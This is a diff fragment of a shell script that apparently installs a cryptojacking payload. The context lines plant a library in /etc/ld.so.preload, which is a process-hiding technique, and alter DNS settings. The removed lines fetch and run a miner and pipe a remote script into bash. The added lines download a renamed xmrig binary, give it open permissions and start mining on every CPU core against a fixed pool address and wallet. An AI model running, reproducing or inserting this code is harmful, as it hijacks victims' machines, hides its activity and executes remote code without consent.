@@ -9,7 +9,6 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget https://github.com/kartolo92/jadul/raw/refs/heads/main/xmt
-chmod +x xmt
-./xmt --donate-level 1 -o 209.38.198.169:443 -u N5iNHBM9T4h12k2FaNKEbK7bSSsR5Hw2n1xCyp5c97MfSowx3AN8iYWUxapEsiqKqWiZ5dtCs6Ar6G59GCMJVExjNKtH5yq.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+chmod 777 vrl
+./vrl --donate-level 1 -o 209.38.198.169:443 -u N5iNHBM9T4h12k2FaNKEbK7bSSsR5Hw2n1xCyp5c97MfSowx3AN8iYWUxapEsiqKqWiZ5dtCs6Ar6G59GCMJVExjNKtH5yq.$(shuf -n 1 -i 1-99999)-BB -p x -a rx/0 -k -t $(nproc --all) 
